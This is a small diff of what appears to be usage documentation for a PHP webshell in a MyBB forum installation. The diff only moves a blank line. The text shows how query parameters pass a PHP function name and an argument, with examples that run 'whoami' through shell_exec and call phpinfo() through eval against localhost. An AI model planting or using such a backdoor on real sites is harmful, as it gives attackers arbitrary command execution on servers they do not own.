@@ -9,8 +9,8 @@ A simple PHP webshell:
     http://127.0.0.1/mybb/?cmd=FUNCTION&command=COMMAND
     
   Examples:
+  
     http://127.0.0.1/mybb/?cmd=shell_exec&command=whoami
-    
     http://127.0.0.1/mybb/?cmd=eval&command=phpinfo();
     
 Current functions:
